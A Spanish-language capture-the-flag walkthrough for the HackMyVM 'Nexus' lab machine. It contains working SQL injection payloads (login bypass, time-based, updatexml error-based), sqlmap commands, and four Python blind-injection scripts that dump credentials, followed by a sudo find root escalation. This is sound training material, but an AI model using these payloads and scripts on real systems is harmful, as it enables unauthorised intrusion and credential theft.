## Bajamos la máquina vulnerable

1- Bajamos la máquina:

  ```bash
  https://hackmyvm.eu/machines/machine.php?vm=Nexus
  ```
2- Montamos la máquina y nos aparece su IP en mi caso
  ```bash
  192.168.1.45
  ```
3- ya en nuestra máquina atacante hacemos un barrido para ver si aparece nuestra máquina victima
  ```bash
  sudo arp-scan -l
  ```
  Ahí nos aparece nuestra máquina

 ## FASE ENUMERACIÓN

Realizamos un scan de puertos y servicios con sus versiones que corren en la máquina víctima:

```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 192.168.1.45 -oN puertosYservicios
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 48:42:7a:cf:38:19:20:86:ea:fd:50:88:b8:64:36:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNisH88omWEmamx1HuZpPoFTndSD5v4+IJIYYDOFKUnOjdCGeEw4ovGjRvjUWst9Ru5o1FgknmUYU9H1FA2/wwg=
|   256 9d:3d:85:29:8d:b0:77:d8:52:c2:81:bb:e9:54:d4:21 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJEbI0M6PcaMWGl0AV0pd1nGMxU54TWqnf362HOXpBJK
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
```
-Puerto 22 con SSH versión 9.2p1 no vulnerable a enumeración de usuarios
-Puerto 80 HTTP por el que corre un apache versión 2.2.62...al palo, casi versión vulnerable pero no

Nos vamos a centrar en el puerto 80.

Lanzamos un whatweb para ver si reporta algo:
```bash
whatweb 192.168.1.45 -v
```
```
WhatWeb report for http://192.168.1.45
Status    : 200 OK
Title     : <None>
IP        : 192.168.1.45
Country   : RESERVED, ZZ

Summary   : Apache[2.4.62], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.62 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Debian Linux
        String       : Apache/2.4.62 (Debian) (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Fri, 20 Jun 2025 20:45:03 GMT
        Server: Apache/2.4.62 (Debian)
        Last-Modified: Sun, 20 Apr 2025 16:03:33 GMT
        ETag: "339-63337e4b0b5a2-gzip"
        Accept-Ranges: bytes
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 429
        Connection: close
        Content-Type: text/html
```
No vemos nada interesante, visitamos la página web, miramos el código fuente por si acaso, y no vemos nada relevante

En este momento ya toca un poco de FUZZING, yo lo realizo con varias herramientas que nunca se sabe, aquí dejo solo una:
```bash
feroxbuster --url "http://192.168.1.45" -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -x php,txt,html,zip,log,bin
```
```
__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.1.45
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, zip, log, bin]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       47l       86w      825c http://192.168.1.45/
200      GET       47l       86w      825c http://192.168.1.45/index.html
200      GET     1641l     5430w    75134c http://192.168.1.45/index2.php
200      GET       26l       36w      352c http://192.168.1.45/login.php
[####################] - 2m   1453403/1453403 0s      found:4       errors:0      
[####################] - 2m   1453403/1453403 12450/s http://192.168.1.45/
```

Veamos ahora tenmemos:
```
http://192.168.1.45/index.html
http://192.168.1.45/index2.php
http://192.168.1.45/login.php
```

vamos pues por orden y miro "http://192.168.1.45/index2.php", accedo a su codigo fuente con ctrl+u o:
```bash
view-source:http://192.168.1.45/index2.php
```
y revisando el código veo:
```
<li>NEXUS> initialize global protocol --login</li>
<li>AUTHORIZATION REQUIRED</li>
<li>NEXUS MSG> _ AUTHORIZATION PANEL :: http://[personal ip]/auth-login.php</li>
```
pruebo con:
```bash
http://192.168.1.45/auth-login.php
```
y encuentro una ruta válida

## Ganando acceso a la máquina

veo un panel de acceso, miro el código fuente:
```
<form method="POST" action="login.php">
            <input type="text" name="user" placeholder="Usuario" required><br>
            <input type="password" name="pass" placeholder="Contraseña" required><br>
            <input type="submit" value="Ingresar">
```
hay dos parámetros "user" y "pass" que se envían a login.php
no sabemos user ni pass pero probamos una inyeccion sql en el parámetro "user" el típico:
```
' or 1=1-- -
```
y logramos acceso...a...nada?...bueno sabemos que es vulnerable

## EXPLOTACIÓN CON SQLMAP

Si no quereis liaros la cabeza, sabiendo que hay un parámetro vulnerable usamos sqlmap:
 extraemos las bases de datos:
 ```bash
sqlmap -u http://192.168.1.45/auth-login.php --forms --dbs --batch
```
```
[10:44:10] [INFO] fetching database names
[10:44:10] [INFO] resumed: 'information_schema'
[10:44:10] [INFO] resumed: 'sion'
[10:44:10] [INFO] resumed: 'mysql'
[10:44:10] [INFO] resumed: 'performance_schema'
[10:44:10] [INFO] resumed: 'Nebuchadnezzar'
[10:44:10] [INFO] resumed: 'sys'
```
ineteresante: Nebuchadnezzar

Ahora extraemos las tablas de la base de datos:
```bash
sqlmap -u http://192.168.1.45/auth-login.php --forms -D Nebuchadnezzar --tables --batch
```
```
[10:45:47] [INFO] fetching tables for database: 'Nebuchadnezzar'
[10:45:47] [INFO] resumed: 'users'
Database: Nebuchadnezzar
[1 table]
+-------+
| users |
+-------+
```

una sola tabla, ahora extraemos las columans de la tabla users:
```bash
sqlmap -u http://192.168.1.45/auth-login.php --forms -D Nebuchadnezzar -T users --columns --batch
```
```
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[10:47:34] [INFO] fetching columns for table 'users' in database 'Nebuchadnezzar'
[10:47:34] [INFO] resumed: 'id'
[10:47:34] [INFO] resumed: 'int(11)'
[10:47:34] [INFO] resumed: 'username'
[10:47:34] [INFO] resumed: 'varchar(50)'
[10:47:34] [INFO] resumed: 'password'
```
columnas username y password, vamos a volcar el contenido de ellas:

```bash
sqlmap -u http://192.168.1.45/auth-login.php --forms -D Nebuchadnezzar -T users -C username,password --dump --batch
```
```
Table: users
[2 entries]
+----------+--------------------+
| username | password           |
+----------+--------------------+
| admin    | cambiame2025       |
| shelly   | F4ckTh3F4k3H4ck3r5 |
+----------+--------------------+
```

ya tenemos dos user y dos pass


## EXPLOTACIÓN MANUAL

Aquí viene la madre del cordero, no os exagero si estuve al menos una hora hasta que dí como hacerlo.

sabemos que la peticion se tiene que hacer a:
```bash
http://192.168.1.45/login.php
```
los parámetros a rellenar:
```
user
pass
```

lo primero mandamos una peticion con curl y vemos si hacemos bien la petición:
```bash
curl -X POST http://192.168.1.45/login.php \                                                                                                                                                                 
-d "user=lala" \
-d "pass=x"  
```
respuesta:
```
<pre style='color:#00ff00;'>Acceso denegado.</pre>

<style>


body {
    background-color: black;
    color: #00ff00;
    font-family: 'Courier New', Courier, monospace;
    text-align: center;
    margin-top: 100px;
}

.matrix-container {
    display: inline-block;
    background-color: rgba(0, 255, 0, 0.1);
    padding: 40px;
    border: 2px solid #00ff00;
    border-radius: 10px;
}

</style>
```
acceso denegado, sabemos que la data se envía bien, probamos la inyección sql:
```bash
curl -X POST http://192.168.1.45/login.php \                                                                                                                                                                        
-d "user='or 1=1-- -" \
-d "pass=x"
```
```
<pre style='color:#00ff00;'>Acceso concedido. Bienvenido, 'or 1=1-- -.</pre>

<style>


body {
    background-color: black;
    color: #00ff00;
    font-family: 'Courier New', Courier, monospace;
    text-align: center;
    margin-top: 100px;
}

.matrix-container {
    display: inline-block;
    background-color: rgba(0, 255, 0, 0.1);
    padding: 40px;
    border: 2px solid #00ff00;
    border-radius: 10px;
}

</style>
```

vemos "Acceso concedido. Bienvenido, 'or 1=1-- -" luego funciona la inyección, más o menos intuimos que casi seguro que la consulta es algo así:
```
"SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
```
al realizar la consulta queda:
```
SELECT * FROM users WHERE username = '' OR 1=1 -- - AND password = 'da igual lo que pongas'
```
todo esto:
```
-- - AND password = 'da igual lo que pongas'
```
al ir detrás de "-- -" queda fuera de la consulta.

probamos una inyeccion basada en tiempo:
```
curl -X POST http://192.168.1.45/login.php \                                                                                                                                                                         
-d "user='or sleep(5)-- -" \
-d "pass=x"
```

y tarda 5 segundos en cargar..es inyectable a un time based, pero me la voy a jugar un un blind, ahí a lo loco, que no estaba para hacer scripts xD:

Vale, os voy a explicar un truquito:

updatexml() es una función de MySQL que se usa normalmente para modificar valores dentro de un documento XML.

Pero en las inyecciones SQL, se usa como truco para forzar un error que revele datos. 

Vamos a explicarlo

```
updatexml(xml_doc, xpath_expr, new_value)
```
esta función spera tres argumentos, Pero si le das algo que no sea un XML válido, MySQL lanza un error con el contenido que le pasaste

jeje ahí es dónde la liamos

```
SELECT updatexml(1, 'LLL', 1);
```
y esto lanza un error más o menos así:

```
XPATH syntax error: 'LLL'
```
Si en vez de LLL le metemos una consulta reflejará la consulta

Después de toda esta chaqueta:

```bash
curl -X POST http://192.168.1.45/login.php \                                                                                                                                                                          
  -d "user=' AND updatexml(1, concat(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 0,1), 0x7e), 1) -- -" \
  -d "pass=x"
```
📖 ¿Qué hace?
updatexml(...): Lo expliqué...el tostón de antes

concat(0x7e, ..., 0x7e): junta la salida de la consulta, en este caso el nombre de la base de datos entre ~ para que sea fácil de ver.

SELECT schema_name FROM information_schema.schemata LIMIT 0,1: saca el primer nombre de base de datos, aquí itineraremos 0,1...1,1...2,1...

Así que vamos a utilizar:

```
' AND updatexml(1, concat(0x7e, (NUESTRA CONSULTA SQL), 0x7e), 1) -- -"
```
la consulta para ver el nombre de la base de datos "SELECT schema_name FROM information_schema.schemata LIMIT 0,1" :

```bash
curl -X POST http://192.168.1.45/login.php \                                                                                                                                                               
  -d "user=' AND updatexml(1, concat(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 0,1), 0x7e), 1) -- -" \
  -d "pass=x"

```
```
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '~information_schema~' in /var/www/html/login.php:22
Stack trace:
#0 /var/www/html/login.php(22): mysqli-&gt;query()
#1 {main}
  thrown in <b>/var/www/html/login.php</b> on line <b>22</b><br />
```

primera base de datos:
```
'~information_schema~'
```
con 1,1
```
'~sion~'
```
con 2,1
```
'~mysql~'
```
con 3,1
```
'~performance_schema~'
```
con 4,1
```
'~Nebuchadnezzar~'
```
con 5,1
```
'~sys~'
```

recapitulando tenemos estas bases de datos:
```
information_schema
sion
mysql
performance_schema
Nebuchadnezzar
sys
```
Ahora nos fijamos en Nebuchadnezzar, una vez que sabemos la base de datos, hay que saber las tablas con esta consulta "SELECT table_name FROM information_schema.tables WHERE table_schema='Nebuchadnezzar' LIMIT 0,1":
con limite 0,1...con el 1,1 ya no reflejaba resultado
```bash
curl -X POST http://192.168.1.45/login.php \                                                                                                                                                                          
  -d "user=' AND updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='Nebuchadnezzar' LIMIT 0,1), 0x7e), 1) -- -" \
  -d "pass=x"
```
```
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: XPATH syntax error: '~users~' in /var/www/html/login.php:22
Stack trace:
#0 /var/www/html/login.php(22): mysqli-&gt;query()
#1 {main}
  thrown in <b>/var/www/html/login.php</b> on line <b>22</b><br />
```

Tenemos una base de datos que se llama "Nebuchadnezzar" que contiene una sola tabla de nombre "users", ahora toca las columnas:
```bash
curl -X POST http://192.168.1.45/login.php \
  -d "user=' AND updatexml(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema='Nebuchadnezzar' AND table_name='users' LIMIT 0,1), 0x7e), 1) -- -" \
  -d "pass=x"
```
```
'~id~'
```
con LIMIT 1,1:
```
'~username~'
```
y con LIMIT 2,1:
```
'~password~'
```

Ahora vamos a enumerar usuario por usuario:
```bash
curl -X POST http://192.168.1.45/login.php \                                                                                                                                                                          
  -d "user=' AND updatexml(1, concat(0x7e, (SELECT CONCAT(username, 0x3a, password) FROM Nebuchadnezzar.users LIMIT 0,1), 0x7e), 1) -- -" \
  -d "pass=x"

```

con LIMIT 0,1:
```
 '~shelly:F4ckTh3F4k3H4ck3r5~'
```
con LIMIT 1,1:
```
'~admin:cambiame2025~'
```

Tenemos dos user con sus pass:
```
shelly:F4ckTh3F4k3H4ck3r5
admin:cambiame2025
```

## ACCESO POR SSH

Tenemos dos usuarios y dos pass, utilizamos el de shelly:
```
ssh shelly@192.168.1.45
```
metemos el pass:F4ckTh3F4k3H4ck3r5

y estamos dentro, enumeramos un poco (id para ver si estamos en algún grupo privilegiado, printenv por si hay algo en la variable de entorno, find / -perm -4000 2>/dev/null
para ver si hay permisos SUI)
y por fin:
```bash
 sudo -l
```
```
sudo: unable to resolve host NexusLabCTF: Nombre o servicio desconocido
Matching Defaults entries for shelly on NexusLabCTF:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD, use_pty

User shelly may run the following commands on NexusLabCTF:
    (ALL) NOPASSWD: /usr/bin/find
```

vamos a nuestra página de binarios de confianza:
```bash
https://gtfobins.github.io/
```
buscamos el binario "find" y clicamos en "sudo" que es lo que nos deja:

```
Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

    sudo find . -exec /bin/sh \; -quit

```

ajustamos la consulta a nuestros intereses, lanzando el find como usuario root y con la ruta del binario:

```
sudo -u root /usr/bin/find . -exec /bin/sh \; -quit
```
```
sudo: unable to resolve host NexusLabCTF: Nombre o servicio desconocido
# id
uid=0(root) gid=0(root) grupos=0(root)
# 
```

ya somos root


## APORTACIÓN PARA EL TIME BASED ERROR

Me aburría, y creé un script para buscar primero las bases de datos:

```bash
import requests
import time

TARGET = "http://192.168.1.45/login.php"
DELAY = 0.5 # Ajustar tiempo
MAX_LEN = 20
MAX_DB = 5

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

print("[*] Enumerando nombres de bases de datos con inyección ciega de tiempo...\n")

for db_index in range(MAX_DB):
    db_name = ""
    for i in range(1, MAX_LEN + 1):
        found = False
        for ascii_code in range(32, 127):  # Caracteres imprimibles
            payload = (
                f"' OR IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata "
                f"LIMIT {db_index},1),{i},1))={ascii_code},SLEEP({DELAY}),0)-- -"
            )
            data = {
                'user': payload,
                'pass': 'x'
            }

            start = time.time()
            requests.post(TARGET, data=data, headers=headers)
            elapsed = time.time() - start

            if elapsed > DELAY:
                db_name += chr(ascii_code)
                print(f"\r[+] Base de datos #{db_index}: {db_name}", end='', flush=True)
                found = True
                break

        if not found:
            break
    if db_name:
        print()  # Salto de línea después del nombre completo
```
 Qué hace:
Recorre posibles nombres de bases de datos (schema_name) uno a uno.

Letra por letra, comprueba si el carácter coincide.

Si el servidor tarda >0.5s, considera que ha acertado y guarda la letra.


```
python script.py                                                                                                                                                                         
[*] Enumerando nombres de bases de datos con inyección ciega de tiempo...

[+] Base de datos #0: information_schema
[+] Base de datos #1: sion
[+] Base de datos #2: mysql
[+] Base de datos #3: performance_schema
[+] Base de datos #4: Nebuchadnezzar
```

Ahora enumeramos las tablas de la base de datos Nebuchadnezzar:

```bash
import requests
import time

TARGET = "http://192.168.1.45/login.php"
DELAY = 0.5
MAX_LEN = 20
MAX_TABLES = 10  # Cantidad de tablas que quieres enumerar

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

print("[*] Enumerando nombres de tablas de la base de datos 'Nebuchadnezzar'...\n")

for table_index in range(MAX_TABLES):
    table_name = ""
    for i in range(1, MAX_LEN + 1):
        found = False
        for ascii_code in range(32, 127):  # Caracteres imprimibles
            payload = (
                f"' OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema='Nebuchadnezzar' LIMIT {table_index},1),{i},1))={ascii_code},SLEEP({DELAY}),0)-- -"
            )
            data = {
                'user': payload,
                'pass': 'x'
            }

            start = time.time()
            requests.post(TARGET, data=data, headers=headers)
            elapsed = time.time() - start

            if elapsed > DELAY:
                table_name += chr(ascii_code)
                print(f"\r[+] Tabla #{table_index}: {table_name}", end='', flush=True)
                found = True
                break

        if not found:
            break
    if table_name:
        print()  # Salto de línea después del nombre completo
```
```
python script_tablas.py                                                                                                                                                                   
[*] Enumerando nombres de tablas de la base de datos 'Nebuchadnezzar'...

[+] Tabla #0: users
```

Ahora enumeramso columnas:
```bash
import requests
import time

TARGET = "http://192.168.1.45/login.php"
DELAY = 0.5
MAX_LEN = 20
MAX_COLS = 10  # Número máximo de columnas que intentaremos enumerar

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

print("[*] Enumerando nombres de columnas de la tabla 'users' en la base de datos 'Nebuchadnezzar'...\n")

for col_index in range(MAX_COLS):
    col_name = ""
    for i in range(1, MAX_LEN + 1):
        found = False
        for ascii_code in range(32, 127):  # Caracteres imprimibles
            payload = (
                f"' OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema='Nebuchadnezzar' AND table_name='users' LIMIT {col_index},1),{i},1))={ascii_code},SLEEP({DELAY}),0)-- -"
            )
            data = {
                'user': payload,
                'pass': 'x'
            }

            start = time.time()
            requests.post(TARGET, data=data, headers=headers)
            elapsed = time.time() - start

            if elapsed > DELAY:
                col_name += chr(ascii_code)
                print(f"\r[+] Columna #{col_index}: {col_name}", end='', flush=True)
                found = True
                break

        if not found:
            break
    if col_name:
        print()  # Salto de línea después del nombre completo
```
```
[*] Enumerando nombres de columnas de la tabla 'users' en la base de datos 'Nebuchadnezzar'...

[+] Columna #0: id
[+] Columna #1: username
[+] Columna #2: password

```
Ahora extraemkos los datos

```bash
import requests
import time

TARGET = "http://192.168.1.45/login.php"
DELAY = 0.5
MAX_LEN = 30      # Máximo largo esperado para cada dato
MAX_ROWS = 10     # Número máximo de filas a extraer
DB_NAME = "Nebuchadnezzar"
TABLE_NAME = "users"
COLUMNS = ["id", "username", "password"]

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

def extract_value(row_index, column_name):
    value = ""
    for i in range(1, MAX_LEN + 1):
        found_char = False
        for ascii_code in range(32, 127):  # caracteres imprimibles
            payload = (
                f"' OR IF(ASCII(SUBSTRING((SELECT {column_name} FROM {DB_NAME}.{TABLE_NAME} "
                f"LIMIT {row_index},1), {i}, 1)) = {ascii_code}, SLEEP({DELAY}), 0)-- -"
            )
            data = {'user': payload, 'pass': 'x'}

            start = time.time()
            requests.post(TARGET, data=data, headers=headers)
            elapsed = time.time() - start

            if elapsed > DELAY:
                value += chr(ascii_code)
                print(f"\r[+] Fila #{row_index}, columna '{column_name}': {value}", end='', flush=True)
                found_char = True
                break

        if not found_char:
            break
    return value

print(f"[*] Extrayendo datos de la tabla '{TABLE_NAME}' en la base '{DB_NAME}'...\n")

for row in range(MAX_ROWS):
    row_data = []
    empty_row = True
    for col in COLUMNS:
        val = extract_value(row, col)
        if val:
            empty_row = False
        row_data.append(val)
    if empty_row:
        print("\n[+] Fin de datos.")
        break
    print()  # salto línea después de cada fila
    print(f"Fila #{row}:", row_data)
```
```
[*] Extrayendo datos de la tabla 'users' en la base 'Nebuchadnezzar'...

[+] Fila #0, columna 'password': F4ckTh3F4k3H4ck3r5
Fila #0: ['1', 'shelly', 'F4ckTh3F4k3H4ck3r5']
[+] Fila #1, columna 'password': cambiame2025
Fila #1: ['2', 'admin', 'cambiame2025']

[+] Fin de datos.
```


